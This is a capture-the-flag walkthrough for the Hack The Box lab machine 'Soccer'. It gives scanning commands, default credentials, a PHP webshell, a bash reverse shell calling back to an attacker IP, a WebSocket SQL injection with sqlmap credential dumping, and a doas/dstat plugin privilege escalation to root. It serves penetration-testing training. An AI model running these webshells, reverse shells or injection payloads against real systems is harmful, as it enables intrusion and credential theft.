## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)](Easy)

## 🔍 Recon

### Nmap
```bash
nmap -p- --min-rate 10000 10.10.11.194
nmap -p 22,80,9091 -sCV 10.10.11.194
```

### FFUF (vhost fuzzing)
```bash
ffuf -u http://10.10.11.194 -H "Host: FUZZ.soccer.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
```

### [Feroxbuster](HTTP)
```bash
feroxbuster -u http://soccer.htb
```

---

## ⚙️ Initial Access (Tiny File Manager)

### Default creds
- `admin:admin@123`
- `user:12345`

### PHP Webshell
```php
<?php system($_REQUEST['cmd']); ?>
```

### Upload webshell to `/tiny/uploads/`
```bash
curl http://soccer.htb/tiny/uploads/cmd.php -d 'cmd=id'
```

### Reverse Shell
```bash
curl http://soccer.htb/tiny/uploads/cmd.php -d 'cmd=bash -c "bash -i >& /dev/tcp/10.10.14.6/443 0>&1"'
```

---

## 👤 Priv Esc to `player`

### Check `/etc/nginx/sites-enabled/soc-player.htb`

Update `/etc/hosts`:
```
10.10.11.194 soccer.htb soc-player.soccer.htb
```

### WebSocket SQLi Injection
Payload:
```json
{"id": "0 OR 1=1-- -"}
```

### Sqlmap Command (WebSocket)
```bash
sqlmap -u ws://soc-player.soccer.htb:9091 \
--data '{"id": "1234"}' \
--dbms mysql --batch --level 5 --risk 3 --threads 10
```

Dump credentials:
```bash
sqlmap -u ws://soc-player.soccer.htb:9091 \
--data '{"id": "1234"}' \
-D soccer_db -T accounts --dump --threads 10
```

### Login as Player
```bash
su player  # or SSH
# Password: PlayerOftheMatch2022
```

---

## 🔓 Priv Esc to root

### doas Privilege Escalation
```bash
# Check allowed commands
doas -l

# Write plugin
echo -e 'import os\nos.system("/bin/bash")' > /usr/local/share/dstat/dstat_0xdf.py

# Trigger plugin
doas /usr/bin/dstat --0xdf
```